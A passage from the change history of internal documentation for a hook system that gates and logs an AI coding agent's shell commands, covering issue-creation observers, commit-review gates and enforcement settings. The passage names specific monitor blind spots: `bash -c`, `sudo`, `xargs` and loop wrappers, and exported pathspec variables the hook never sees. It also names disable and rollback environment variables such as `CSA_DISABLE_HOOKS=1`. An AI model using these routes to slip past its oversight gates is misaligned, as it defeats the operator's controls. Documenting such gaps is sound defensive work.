how often ambiguity would have been the deciding factor) but never treated as a reason to alter
the command's outcome.

**Detection blind spots (fix-round 2, finding 5) — named explicitly, since board-steward's 30-event
audit needs its denominator understood.** Executed and confirmed by the reviewer, 2026-09-21: each
of these yields ZERO observations even though the underlying create genuinely runs — `bash -c "gh
issue create ..."` (embedded in a string argument, never a literal argv token), `sudo gh issue
create ...` (`sudo` is not a stripped leading-invoker word — only `env`/`command` are), `xargs gh
issue create ...` (the real flag values arrive via a pipe on stdin, never as literal tokens in the
command string this hook receives), and a `for` loop whose body invokes `gh_issue.sh create`
(shell control-flow tokens can desync the segment splitter, and a loop-variable-interpolated flag
value is never resolved by this static, non-executing reader). Under-detection (a false negative)
is the safe direction for a pure observer that can never deny anything — the opposite (a false
positive) is what the 30-event audit actually screens for — but both matter to that audit's
denominator, which is why both are named rather than only the safe one.

**A `priority:` LABEL never satisfies the Priority FIELD requirement (fix-round 2, finding 6) —
deliberately, not by mistake.** This board's own dossier (`.claude/oversight/board-steward.md` §2)
rules fields are truth, not labels — a `priority:` label is a legacy, being-retired convention on
this board. A create carrying `--label "priority: P1"` and no `--priority` flag is therefore
flagged (`missing: ["priority"]`) on purpose; the audit must classify that class of create as
genuinely missing its Priority field.

**Enforcement is a SEPARATE, LATER commit, gated on real data** — this commit lands both layers as
pure observers; nothing here denies a creation for any reason. The plan's own bar: board-steward
audits a 30-event sample of what this observer *would* have denied; ≤3 false positives clears the
way for the enforcement commit (architect + devops-architect rule), >3 means the misclassified
label/priority-detection classes get fixed and a fresh 30-event sample is drawn. Until that
enforcement commit lands, `create-missing-triage` / `create-missing-triage-would-deny` /
`bare-issue-create` / `create-observer-ambiguous` are purely informational rows in
`~/.claude/.enforcement/log.jsonl`.

### From "Sibling entry points": the Workflow gate's incident record and enforcement note

These are three chunks of the `PreToolUse:Workflow` bullet, in order: the incident that followed the
sentence ending "...are blind to them."; the paragraph on why delegating to
`check_workflow_agent_purity.py` matters; and the closing sentence about enforcement.

Measured that day: one workflow ran 3,284 calls on `claude-fable-5-1` (2x Opus pricing) and
  exhausted an account mid-run; three others ran 531/370/72 calls on `claude-opus-5`; none passed
  `model:`. A memory entry already advised passing it and did not hold — the same "a prose-only
  rule on a Workflow script's largest agent population is the known weak shape in this runtime"
  argument that motivated `check_workflow_agent_purity.py`.

**That delegation is load-bearing, not a style choice.** The first version hand-rolled its own
  scanner and an Opus review measured it against the real scripts on disk: it denied BOTH,
  including `workflows/issue-wheel-triage.js`, which the nightly ISSUE WHEEL runs unattended — a
  100% false-deny rate on real work — while separately false-ALLOWING a nested schema property
  named `model`. Four defects, all already solved in the sibling. If the scanning needs to change,
  change it in `check_workflow_agent_purity.py` so both consumers get the fix;
  `hooks/tests/test_workflow_model_gate.py` pins every one of those shapes, and its
  `test_real_workflow_scripts_are_allowed` case runs the gate against whatever `.js` files
  actually live in `~/.claude/workflows/` so a regression fails loudly instead of silently
  re-blocking the wheel.

Note it does
  **not** get an observer-first shakedown period: enforcement is globally ON via `~/.claude/.enforce`,
  so it denies from the moment it lands.

### From "Fail-closed vs. fail-open": fix-round tags on the pathspec and `--rekey` items

- **`pathspec-env-set` in gate 3b (fix-round-4, R6-B2, GH #5886).** One of
  `GIT_LITERAL_PATHSPECS`/`GIT_GLOB_PATHSPECS`/`GIT_NOGLOB_PATHSPECS`/`GIT_ICASE_PATHSPECS` present
  in the hook's own process environment is refused outright and can never be cleared by recording
  a review, for the identical reason as `unresolvable-pathspec` above — with the var set, the hook
  cannot trust its own digest computation to mean the same thing the real `git commit` will do, so
  reviewing that digest would again mean reviewing a digest of the *wrong* content. See the
  `--rekey` subsection above for what this does and does not close: the check fires only when the
  variable is already present in the hook process's OWN inherited environment at the moment it
  runs — never anything set by the gated command itself (an inline prefix, an `export`, `env`, or
  `set -a`, whether typed before or in the same shell invocation as the `git commit`). Both `e21.py`
  (inline prefix) and `e2e/x4.py` (`export VAR=1; git commit ...` / `export VAR=1 && git commit
  ...`, one shell invocation) demonstrate live that the hook's own process never observes either
  shape — the PreToolUse hook runs as a separate process from the Bash tool's shell and only ever
  sees the environment it was launched with, not anything a gated command assigns, exports, or
  persists at run time. This is the #5892 class in full, not a narrower "inline only" gap.

- **`rekey-root-digest-format-stale` in `record_review.py --rekey` (fix-round-4, R7-B1, GH #5886;
  not one of gate 3b's own reasons — this is `record_review.py`'s own refusal, but the same
  "no amount of recording clears this" shape).** A `--rekey` whose chain root carries no `dg=2`
  field refuses outright — the root's digest may have been computed under the pre-R6-B1 rendering,
  which cannot distinguish a single oddly-named reviewed entry from fabricated content, so no
  amount of re-attempting `--rekey` against that same root can ever clear it; the only path forward
  is a fresh `--pre-commit` review of the current content.
- **`rekey-lossy-material` in `record_review.py --rekey` (fix-round-3 BLOCKER B1, GH #5886; named
  here fix-round-8, same-text pass — a prior round-8 finding noted this reason was absent from
  both docs despite existing in code since round 3; also not one of gate 3b's own reasons, same
  "own refusal, same shape" note as above).** A `--rekey` whose reconstruction hit ANY of the four
  lossy/ambiguous conditions in the lossless-material check above (a read-truncated file, invalid
  UTF-8, the aggregate-size-or-readable-file-count cap, or an unreadable file) refuses outright,
  REGARDLESS of whether the reconstructed digest happens to match the prior one — a matching
  digest built from lossy material proves nothing, so re-attempting the identical `--rekey` call
  can never clear it either; the only path forward is a fresh `--pre-commit` review of the current
  content, same as `rekey-root-digest-format-stale` above.

### From "Enforcement-state mechanics": machine-state notes

The first fragment was a parenthetical at the end of step 3 of the precedence list; the second was
the paragraph that followed the list.

(Confirmed present on this
   machine: 0 bytes, present since Jul 1.)

**Current machine state (per `CLAUDE.md` §7's 2026-08-23 correction, reconfirmed live for this
document):** the global `~/.claude/.enforce` marker exists, so **enforcement is ON for every
repo on this machine**, unconditionally — per-project `.claude/.csa-enforce` opt-outs (or their
absence) never even get consulted, because step 3 short-circuits before step 4 runs. This
reversed an earlier "warn/log-only by default" rollout posture; the operator's ruling (recorded
on #4400) is that the marker stays, because the unattended oversight wheel's safety model
requires live gates, and the token-cost complaint is answered by *proportional* review (the
risk-tier ladder — see `review-ladder.md`) rather than by removing gates.

### From "The decision log": where the sample rows came from

Two real lines from this machine's live log (2026-08-30), from a **test-suite invocation
exercising the gate** (its own `repo` field, kept visible below rather than trimmed out, shows a
pytest tmp path — this is `check_safety_core_parity`'s / `gh_issue_close_gate`'s own test suite
setting `CSA_ENFORCE=1` inline against a throwaway repo, not a production denial; no genuine
non-test `gh_issue_close_gate` denial exists in this machine's live log as of this writing —
verified: `grep '"decision": "deny"' .enforcement/log.jsonl | grep '"hook": "gh_issue_close_gate"' | grep -v pytest-of` returns nothing), showing gate 5 actually denying under enforcement:

### Where the code and `CLAUDE.md` agree / diverge (2026-08-30 to 2026-09-20)

Verified 2026-08-30 (`git diff --stat CLAUDE.md` shows no working-tree changes — the file is
clean at its committed HEAD): as of that date the live `CLAUDE.md` §7 text and the live
`pretooluse_bash.py` dispatcher docstring described the **same** eight-gate order, including gate
3c and the seven-blocking-gates count.

**Known drift as of 2026-09-13 (gate 1c added, #5310):** `pretooluse_bash.py`'s own dispatcher
docstring and this page were updated in the same change that added gate 1c
(`block_gcloud_identity`); `~/.claude/CLAUDE.md` §7's prose (a separate runtime file, out of this
change's own assigned scope) still describes the pre-1c eight/seven-gate counts as of this
writing and needs its own follow-up edit to stay current — flagged here rather than silently
left stale.

**Known drift as of 2026-09-20 (`issue_create_observer` added, #5827):**
`pretooluse_bash.py`'s own dispatcher docstring and this page were updated in the same change that
wired in `issue_create_observer` (see its own section above, between Gate 6 and "Fail-closed vs.
fail-open"); `~/.claude/CLAUDE.md` §7's gate-count prose (a separate runtime file, out of this
change's own assigned scope — CLAUDE.md is a serialized file this session was directed not to
edit) does not mention this observer at all and needs its own follow-up edit — the exact addition
is one sentence: *"A separate, unconditional, never-blocking observer (`issue_create_observer`,
#5827) also runs on every Bash command, logging issue-creation quality signals
without ever affecting any gate's allow/deny outcome."* (fix-round 1, finding 7: CLAUDE.md §7
itself counts ELEVEN gates in this chain, ten of which can block — "the ten gates'" would have
been wrong on arrival; "any gate's" is correct regardless of how that count moves later.) Flagged
here rather than silently left stale, matching the 2026-09-13 precedent immediately above.

### Re-verification, 2026-10-13

Re-checked against `hooks/pretooluse_bash.py` for the restructure that produced this page's current
layout. `resolve_block()` runs the issue-creation observer first, then gates 1, 1b, 1c, 2, 3, 3b,
3c, 4, 5, 5b and 6 in that order: eleven gates, ten of which can block. The contract's gate
paragraph (`CLAUDE.md` §7) states the same eleven/ten count. It still does not mention
`issue_create_observer`, so the one-sentence addition quoted in the 2026-09-20 note above is still
outstanding. Line-number citations in the sections above were replaced with symbol names, because
the `pretooluse_bash.py` citations had all drifted as the file grew. (`hooks/doc_citation_check.py`
reports only citations that no longer resolve: a missing file, a line past the end of the file, or a
blank target. Its header advises preferring a symbol to a line number; it does not enforce that.)

A review pass the same day corrected the rule's scope (a command reaches the dispatcher only through
`bash_gate.sh`, and only if it matches one of that shim's patterns), moved the remaining fix-round
narratives into this History, and added to the fail-closed list the dispatcher's parse-error branch,
gate 1c's `run-path-too-ambiguous` and truncated-scan cases, and gate 5b's untokenizable segments.
Each was checked against the code.

### Statements corrected in place during the 2026-10-13 restructure

Each statement below was replaced in the sections above because it no longer matched the code.

> `bash_gate.sh` is a cheap shell fast-path: a Bash command that mentions neither `git` nor
>   `gh issue close` costs essentially nothing — the Python dispatcher isn't even spawned.

The fast-path was described as matching only `git` and `gh issue close`; it has since gained
`gcloud`, the inline escape-variable name, `gh issue create` and the protected-board arms. The old
text also did not say that `CSA_DISABLE_HOOKS=1` skips the shim.

> with two narrow arms — `*gh*issue*create*` and
> `*gh_issue.sh*create*` — mirroring

The observer section named two fast-path arms; the second was removed as unreachable (shellcheck
SC2221/SC2222) with the matched set unchanged.

> `~/.claude/hooks/pretooluse_bash.py` (dispatcher) plus the gate modules it imports:
> `block_branch_ops.py`, `block_unscoped_commit.py`, `check_staged_scope.py`,
> `precommit_review_gate.py`, `file_claims.py`, `gh_issue_close_gate.py`, `churn_tracker.py`, and
> the shared library `_lib.py`.

The module list stopped at the original seven gate modules and omitted gates 1b, 1c and 5b and the
issue-creation observer.

> `pretooluse_bash.py` is the single `PreToolUse:Bash` hook that intercepts every Bash tool call
> before it runs and mechanically blocks (or, in log-only mode, just logs) the git operations this
> runtime has decided are reserved for the human operator or must satisfy specific preconditions
> first. It replaced three separately-spawned bash guards with one Python dispatcher that reads
> the hook event once and runs each gate's pure decision function in a fixed order — cutting the

The problem statement called `pretooluse_bash.py` the single `PreToolUse:Bash` hook that intercepts
every Bash tool call. The registered hook is the `bash_gate.sh` shim, which starts the dispatcher
only for a command that matches one of its patterns (and not at all under `CSA_DISABLE_HOOKS=1`).
The statement also limited the gates to git operations, which no longer describes gates 1c, 5 and
5b.

> (`_sweep_decide()`, default `MAX_FILES=30`, `MAX_TOP_DIRS=4`,
>   `check_staged_scope.py:106-110`, `324-359`)

The module-level constants are named `DEFAULT_MAX_FILES` and `DEFAULT_MAX_TOP_DIRS`. The old text
used the shorthand from the module's comments, and its line citations had drifted.

**Not quoted.** The `repo` field of the two sample rows in "The decision log" showed the author's
account name inside a pytest temporary path. It now reads `pytest-of-user`; nothing else in the rows
changed.

> **Escape hatch (this gate and gate 2 only):**

Gate 1's escape-hatch lead-in named only gates 1 and 2; gates 1b and 1c reuse the same variable.

> Reached only when gates 1–5 did **not** block.

Gate 6 is reached only when no earlier gate blocked, which includes gate 5b.

**Not quoted.** The Gate 5b sentence that named the protected board by its project number, title and
node id was replaced with a generic description. The identifiers were removed from this page; the
registry described in the Gate 5b section still holds them.

> gates 3/3b/3c/4/5 have no escape hatch at all, only their own
> per-gate rollback env vars (`CSA_NO_REQUIRE_PATHSPEC`, `CSA_NO_PRECOMMIT_REVIEW`,
> `CSA_NO_DIRTY_CONFIG_GATE`, `CSA_NO_COMMIT_MUTEX` respectively)

The escape-hatch sentence left out gate 5b and implied gate 5 had a rollback variable of its own.

</details>
